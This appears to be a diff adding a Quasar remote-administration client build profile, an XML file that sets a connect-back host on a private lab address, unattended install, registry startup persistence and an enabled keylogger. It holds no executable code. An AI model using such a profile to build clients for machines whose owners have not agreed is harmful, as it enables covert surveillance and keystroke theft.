@@ -1,0 +1,38 @@
+<settings>
+  <Tag>Bill Gates' Computer</Tag>
+  <Hosts>192.168.56.1:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>b48e9adb-3e3a-4787-a3da-d55b05788383</Mutex>
+  <UnattendedMode>True</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>QuasarClient</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>Quasar</InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Quasar Client Startup</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
